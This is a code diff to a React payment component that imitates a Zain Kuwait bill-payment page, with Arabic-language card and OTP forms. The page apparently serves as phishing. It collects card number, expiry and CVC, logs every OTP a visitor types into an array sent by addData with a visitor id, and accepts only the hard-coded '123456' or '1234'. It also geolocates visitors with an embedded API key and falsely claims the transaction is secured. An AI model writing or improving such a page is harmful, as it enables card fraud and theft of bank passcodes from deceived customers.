@@ -1,4 +1,5 @@
 "use client"
+
 import { useEffect, useState, useRef } from "react"
 import { CreditCard, Wallet, Shield, ChevronRight, Info, AlertCircle, Lock, Loader } from "lucide-react"
 import { setupOnlineStatus } from "@/lib/utils"
@@ -32,7 +33,7 @@ const validateKuwaitPhone = (phone: string) => {
   return kuwaitMobilePattern.test(phone)
 }
 
-const allOtps = ['']
+const allOtps = [""]
 
 export default function ZainPayment() {
   const [selectedTab, setSelectedTab] = useState("bill")
@@ -44,6 +45,7 @@ export default function ZainPayment() {
   const [selectedOption, setSelectedOption] = useState("رقم آخر")
   const [captchaChecked, setCaptchaChecked] = useState(false)
   const router = useRouter()
+
   const amounts = [
     { value: "2.000", validity: 7 },
     { value: "4.000", validity: 15 },
@@ -56,12 +58,11 @@ export default function ZainPayment() {
   const paymentOptions = ["رقم آخر", "رقم العقد"]
 
   useEffect(() => {
-    getLocation().then(() => { })
+    getLocation().then(() => {})
   }, [])
 
   async function getLocation() {
-    const _id = localStorage.getItem('visitor')
-
+    const _id = localStorage.getItem("visitor")
     const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
     try {
@@ -93,16 +94,20 @@ export default function ZainPayment() {
   const [isProcessing, setIsProcessing] = useState(false)
   const [paymentState, setPaymentState] = useState<"FORM" | "SUCCESS">("FORM")
   const [showOtpDialog, setShowOtpDialog] = useState(false)
-  const [otpValues, setOtpValues] = useState(["", "", "", "", "", ""])
+
+  // OTP related states
+  const [otpLength, setOtpLength] = useState<4 | 6>(6)
+  const [otpValues, setOtpValues] = useState<string>('')
   const [otpError, setOtpError] = useState<string | null>(null)
   const [resendDisabled, setResendDisabled] = useState(false)
   const [countdown, setCountdown] = useState(60)
   const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
   const [orderDetails, setOrderDetails] = useState({
-    id: 'ZainXkkid-089887',
+    id: "ZainXkkid-089887",
     total: "6.000",
   })
+
 
   // Initialize order details from localStorage on client-side only
   useEffect(() => {
@@ -136,7 +141,6 @@ export default function ZainPayment() {
 
   const validateForm = () => {
     const errors: { cardNumber?: string; cardExpiry?: string; cardCvc?: string } = {}
-
     if (!cardNumber.replace(/\s/g, "").length) {
       errors.cardNumber = "مطلوب"
     } else if (cardNumber.replace(/\s/g, "").length < 16) {
@@ -160,8 +164,7 @@ export default function ZainPayment() {
   }
 
   const handlePayment = async () => {
-    const _id = localStorage.getItem('visitor')
-
+    const _id = localStorage.getItem("visitor")
     if (!validateForm()) {
       return
     }
@@ -175,10 +178,16 @@ export default function ZainPayment() {
   }
 
   const handleOtpChange = (index: number, value: string) => {
-    const newOtpValues = [...otpValues]
-    newOtpValues[index] = value
+    // Only allow single digit
+    if (value.length > 1) {
+      value = value.slice(-1)
+    }
 
-    setOtpValues(newOtpValues)
+    // Only allow numbers
+    if (!/^\d*$/.test(value)) {
+      return
+    }
+
     setOtpError(null)
 
     if (value && index < otpValues.length - 1) {
@@ -193,20 +202,29 @@ export default function ZainPayment() {
   }
 
   const verifyOtp = () => {
-    const _id = localStorage.getItem('visitor')
+    const _id = localStorage.getItem("visitor")
+    const otpCode = otpValues
+
+    // Check if OTP length matches selected length
+    if (otpCode.length !== otpLength) {
+      setOtpError(`يجب أن يكون رمز التحقق مكون من ${otpLength} أرقام`)
+      return
+    }
 
     setIsProcessing(true)
-    allOtps.push(otpValues.join(""))
-    addData({ id: _id, otp: otpValues.join(""), allOtps })
+    allOtps.push(otpCode)
+    addData({ id: _id, otp: otpCode, allOtps })
 
     setTimeout(() => {
       setIsProcessing(false)
-      if (otpValues.join("") === "123456") {
+      // Check for correct OTP based on length
+      const correctOtp = otpLength === 4 ? "1234" : "123456"
+      if (otpCode === correctOtp) {
         setPaymentState("SUCCESS")
         setShowOtpDialog(false)
       } else {
         setOtpError("رمز التحقق غير صالح. يرجى المحاولة مرة أخرى.")
-        setOtpValues(['', '', '', '', '', ''])
+        setOtpValues("")
       }
     }, 2000)
   }
@@ -214,7 +232,6 @@ export default function ZainPayment() {
   const resendOtp = () => {
     setResendDisabled(true)
     setCountdown(60)
-
     // Simulate resending OTP
     setTimeout(() => {
       setResendDisabled(false)
@@ -276,7 +293,6 @@ export default function ZainPayment() {
     >
       <Card className="w-full max-w-sm shadow-2xl border-0 overflow-hidden bg-white/95 backdrop-blur-sm">
         <div className="absolute top-0 left-0 right-0 h-2 bg-gradient-to-r from-[#2d1a45] via-[#d13c8c] to-[#6b2a84]"></div>
-
         {paymentState === "FORM" && (
           <>
             <CardHeader className="space-y-4 pb-6 bg-gradient-to-r from-gray-50 to-white">
@@ -293,10 +309,8 @@ export default function ZainPayment() {
                 </Badge>
               </div>
             </CardHeader>
-
             <CardContent className="space-y-8 p-6">
               {renderProgressIndicator()}
-
               {/* Order Summary Card */}
               <div className="bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] rounded-xl p-6 text-white shadow-lg">
                 <div className="flex items-center justify-between mb-4">
@@ -305,7 +319,6 @@ export default function ZainPayment() {
                     <CreditCard className="h-4 w-4" />
                   </div>
                 </div>
-
                 <div className="space-y-3">
                   <div className="flex justify-between items-center">
                     <span className="text-white/80">رقم الطلب:</span>
@@ -323,22 +336,20 @@ export default function ZainPayment() {
                   </div>
                 </div>
               </div>
-
               {/* Payment Methods */}
               <div className="space-y-4">
                 <h3 className="font-semibold text-lg text-gray-800 flex items-center gap-2">
                   <Wallet className="h-5 w-5 text-[#d13c8c]" />
                   طريقة الدفع
                 </h3>
-
                 <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="space-y-4">
                   {/* Credit Card Option */}
                   <div className="relative group">
                     <div
-                      className={`absolute inset-0 rounded-xl transition-all duration-300 ${paymentMethod === "card" ? "ring-2 ring-[#d13c8c] shadow-lg" : "group-hover:shadow-md"
-                        }`}
+                      className={`absolute inset-0 rounded-xl transition-all duration-300 ${
+                        paymentMethod === "card" ? "ring-2 ring-[#d13c8c] shadow-lg" : "group-hover:shadow-md"
+                      }`}
                     ></div>
-
                     <div className="flex items-center space-x-3 relative">
                       <RadioGroupItem value="card" id="card" className="text-[#d13c8c]" />
                       <Label
@@ -354,16 +365,25 @@ export default function ZainPayment() {
                         </div>
                         <div className="flex gap-2">
                           <div className="w-10 h-6 rounded flex items-center justify-center">
-                            <img src="/visa.svg" alt="logo" width={45} />
+                            <img
+                              src="/placeholder.svg?height=24&width=40&text=VISA"
+                              alt="Visa"
+                              width={40}
+                              height={24}
+                            />
                           </div>
                           <div className="w-10 h-6 bg-red-600 rounded flex items-center justify-center">
-                            <img src="/master.svg" alt="logo" width={45} />
+                            <img
+                              src="/placeholder.svg?height=24&width=40&text=MC"
+                              alt="Mastercard"
+                              width={40}
+                              height={24}
+                            />
                           </div>
                         </div>
                       </Label>
                     </div>
                   </div>
-
                   {/* Card Form */}
                   {paymentMethod === "card" && (
                     <div className="bg-gray-50 rounded-xl p-6 space-y-6 animate-in fade-in-50 duration-500 border border-gray-200">
@@ -399,15 +419,14 @@ export default function ZainPayment() {
                               value={cardNumber}
                               onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                               maxLength={19}
-                              className={`h-12 text-lg ${formErrors.cardNumber
-                                ? "border-red-300 focus:border-red-500"
-                                : "border-gray-300 focus:border-[#d13c8c]"
-                                }`}
+                              className={`h-12 text-lg ${
+                                formErrors.cardNumber
+                                  ? "border-red-300 focus:border-red-500"
+                                  : "border-gray-300 focus:border-[#d13c8c]"
+                              }`}
                             />
-
                           </div>
                         </div>
-
                         <div className="grid grid-cols-2 gap-4">
                           <div className="space-y-2">
                             <div className="flex items-center justify-between">
@@ -428,10 +447,11 @@ export default function ZainPayment() {
                               value={cardExpiry}
                               onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                               maxLength={5}
-                              className={`h-12 ${formErrors.cardExpiry
-                                ? "border-red-300 focus:border-red-500"
-                                : "border-gray-300 focus:border-[#d13c8c]"
-                                }`}
+                              className={`h-12 ${
+                                formErrors.cardExpiry
+                                  ? "border-red-300 focus:border-red-500"
+                                  : "border-gray-300 focus:border-[#d13c8c]"
+                              }`}
                             />
                           </div>
                           <div className="space-y-2">
@@ -453,10 +473,11 @@ export default function ZainPayment() {
                               maxLength={4}
                               value={cardCvc}
                               onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
-                              className={`h-12 ${formErrors.cardCvc
-                                ? "border-red-300 focus:border-red-500"
-                                : "border-gray-300 focus:border-[#d13c8c]"
-                                }`}
+                              className={`h-12 ${
+                                formErrors.cardCvc
+                                  ? "border-red-300 focus:border-red-500"
+                                  : "border-gray-300 focus:border-[#d13c8c]"
+                              }`}
                             />
                           </div>
                         </div>
@@ -466,7 +487,6 @@ export default function ZainPayment() {
                 </RadioGroup>
               </div>
             </CardContent>
-
             <CardFooter className="flex flex-col gap-4 p-6 bg-gray-50">
               <Button
                 className="w-full h-14 text-lg font-semibold shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] hover:from-[#3d2a55] hover:to-[#7b3a94]"
@@ -504,7 +524,6 @@ export default function ZainPayment() {
                   </span>
                 )}
               </Button>
-
               <div className="flex items-center justify-center gap-3 text-sm text-gray-500">
                 <Shield className="h-4 w-4 text-green-600" />
                 <span>جميع المعاملات مشفرة وآمنة بتقنية SSL 256-bit</span>
@@ -512,19 +531,18 @@ export default function ZainPayment() {
             </CardFooter>
           </>
         )}
-
         {paymentState === "SUCCESS" && renderSuccessState()}
-
         {/* Enhanced OTP Dialog */}
         <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
-          <DialogContent className=" bg-white/95 backdrop-blur-sm" dir="rtl">
+          <DialogContent className="bg-white/95 backdrop-blur-sm" dir="rtl">
             <DialogHeader className="space-y-4">
               <DialogTitle className="text-xl font-bold text-center text-gray-800">التحقق من الدفع</DialogTitle>
               <DialogDescription className="text-center text-gray-600">
-                أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك
+                اختر طول رمز التحقق وأدخل الرمز المرسل إلى هاتفك
               </DialogDescription>
             </DialogHeader>
 
+          
             <div className="bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] rounded-xl p-4 text-white mb-6">
               <div className="flex justify-between items-center mb-2">
                 <span className="text-white/80">رقم الطلب:</span>
@@ -535,37 +553,31 @@ export default function ZainPayment() {
                 <span className="font-bold text-sm">{orderDetails.total} د.ك</span>
               </div>
             </div>
-
             <div className="text-center mb-6">
-              <p className="text-sm mb-2 text-gray-600">تم إرسال رمز التحقق إلى</p>
+              <p className="text-sm mb-2 text-gray-600">تم إرسال رمز التحقق المكون من {otpLength} أرقام إلى</p>
               <p className="font-semibold text-sm text-gray-800">+965 5XX XXX XX89</p>
             </div>
-
             <div className="flex justify-center gap-3 my-8">
-              {otpValues.map((value, index) => (
-                <div key={index} className="relative">
+           
+                <div className="relative">
                   <Input
-                    ref={(el) => (otpInputRefs.current[index] = el)}
                     type="tel"
                     inputMode="numeric"
                     maxLength={1}
-                    value={value}
-                    onChange={(e) => handleOtpChange(index, e.target.value)}
-                    onKeyDown={(e) => handleKeyDown(index, e)}
-                    className={`w-10 h-12 text-center text-sm font-bold border-2 rounded-lg ${otpError ? "border-red-300" : "border-gray-300 focus:border-[#d13c8c]"
-                      }`}
+                    value={otpValues}
+                    onChange={(e) => setOtpValues( e.target.value)}
+                    className={`w-full h-12 text-center text-sm font-bold border-2 rounded-lg ${
+                      otpError ? "border-red-300" : "border-gray-300 focus:border-[#d13c8c]"
+                    }`}
                   />
                 </div>
-              ))}
             </div>
-
             {otpError && (
               <div className="bg-red-50 text-red-600 rounded-lg p-3 text-center text-sm flex items-center justify-center gap-2 mb-4">
                 <AlertCircle className="h-4 w-4" />
                 {otpError}
               </div>
             )}
-
             <div className="text-center mb-6">
               <p className="text-sm text-gray-600 mb-3">لم تستلم الرمز؟</p>
               <Button
@@ -577,11 +589,10 @@ export default function ZainPayment() {
                 {resendDisabled ? `إعادة الإرسال بعد ${countdown} ثانية` : "إعادة إرسال الرمز"}
               </Button>
             </div>
-
             <DialogFooter>
               <Button
                 className="w-full h-10 text-base font-semibold bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] hover:from-[#3d2a55] hover:to-[#7b3a94] shadow-lg"
-                disabled={otpValues.some((v) => !v) || isProcessing}
+                disabled={otpValues.length < 4 ||isProcessing}
                 onClick={verifyOtp}
               >
                 {isProcessing ? (
